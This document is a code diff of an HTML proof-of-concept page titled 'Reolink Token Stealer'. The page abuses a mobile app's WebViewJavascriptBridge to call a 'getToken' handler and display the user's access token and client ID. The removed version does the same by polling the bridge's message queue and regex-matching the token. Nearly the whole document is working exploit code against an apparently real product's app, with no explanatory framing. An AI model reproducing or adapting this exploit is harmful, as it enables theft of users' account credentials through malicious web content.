@@ -1,49 +1,76 @@
-<body style="background:#111; color:#0f0; font-family:monospace;">
-  <pre id="log">[*] Waiting for Bridge...</pre>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Token Stealer</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
+    }
+    h1 {
+      color: #f00;
+    }
+    .section {
+      margin-bottom: 20px;
+    }
+    .label {
+      color: #0ff;
+    }
+    .value {
+      background: #222;
+      padding: 10px;
+      border: 1px solid #0f0;
+      border-radius: 4px;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Reolink Token Stealer</h1>
+  <div class="section">
+    <div class="label">Client ID:</div>
+    <div id="client" class="value">waiting...</div>
+  </div>
+  <div class="section">
+    <div class="label">Access Token:</div>
+    <div id="token" class="value">waiting...</div>
+  </div>
+
   <script>
-    function log(msg) {
-      document.getElementById('log').textContent += '\n' + msg;
+    function waitForBridge(callback) {
+      if (window.WebViewJavascriptBridge) {
+        callback(WebViewJavascriptBridge);
+      } else {
+        document.addEventListener(
+          'WebViewJavascriptBridgeReady',
+          function () {
+            callback(WebViewJavascriptBridge);
+          },
+          false
+        );
+      }
     }
 
-    const poll = setInterval(() => {
-      if (!window.WebViewJavascriptBridge) return;
+    waitForBridge(function (bridge) {
+      console.log('[*] Bridge Detected!');
+      bridge.init(function (msg, cb) {
+        console.log('[*] Bridge initialized via init()');
+        cb("ok");
+      });
 
-      log('[*] Bridge Detected!');
-      clearInterval(poll);
-
-      try {
-        WebViewJavascriptBridge.init(function(data, responseCallback) {
-          log('[*] init() handler received: ' + JSON.stringify(data));
-          if (responseCallback) responseCallback("OK");
-        });
-        log('[*] Bridge initialized via init()');
-      } catch (e) {
-        log('[!] init failed: ' + e);
-      }
-
-      setInterval(() => {
+      // 토큰 요청
+      bridge.callHandler("getToken", null, function (res) {
         try {
-          const queue = WebViewJavascriptBridge._fetchQueue();
-          if (queue && typeof queue === 'string') {
-            const messages = JSON.parse(queue);
-            log('[+] Queue fetched: ' + messages.length + ' message(s)');
-
-            for (const msg of messages) {
-              log('[*] Message: ' + JSON.stringify(msg));
-              if (msg.responseData) {
-                log('[+] responseData: ' + msg.responseData);
-
-                const tokenMatch = msg.responseData.match(/"token"\s*:\s*"([^"]+)"/);
-                if (tokenMatch) {
-                  log('[!!!] Token Found: ' + tokenMatch[1]);
-                }
-              }
-            }
-          }
+          const obj = JSON.parse(res);
+          document.getElementById("token").textContent = obj.token || "(no token)";
+          document.getElementById("client").textContent = obj.clientId || "(no clientId)";
         } catch (e) {
-          log('[!] Error parsing queue: ' + e);
+          document.getElementById("token").textContent = res;
         }
-      }, 1000);
-    }, 500);
+      });
+    });
   </script>
 </body>
+</html>
